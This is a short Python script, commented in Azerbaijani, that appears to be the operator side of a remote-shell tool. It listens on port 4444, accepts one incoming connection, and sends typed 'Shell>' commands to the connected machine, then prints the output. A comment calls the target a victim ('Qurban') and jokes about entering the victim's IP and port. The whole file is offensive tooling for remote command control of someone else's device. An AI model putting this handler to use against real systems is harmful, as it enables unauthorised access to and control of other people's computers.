import socket
# Qurbanın açıq portu olmalıdır. Qurbanın IP və açıq port ünvanı bura yazılır :D
HOST = '127.0.0.1'
PORT = 4444

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Server işə düşdü və {HOST}:{PORT} ünvanını dinləyir...")
    
    conn, addr = server.accept()
    print(f"[+] Uğurlu bağlantı! Qoşulan cihaz: {addr}")
    
    while True:
        try:
            command = input("Shell> ")
            if not command.strip():
                continue
            if command.lower() == 'exit':
                conn.send(command.encode('utf-8'))
                break
            
            conn.send(command.encode('utf-8'))
            
            response = conn.recv(16384).decode('utf-8', errors='ignore')
            print(response)
            
        except Exception as e:
            print(f"[-] Xəta baş verdi: {e}")
            break
            
    conn.close()
    server.close()
    print("[*] Bağlantı bağlandı.")

if __name__ == "__main__":
    start_server()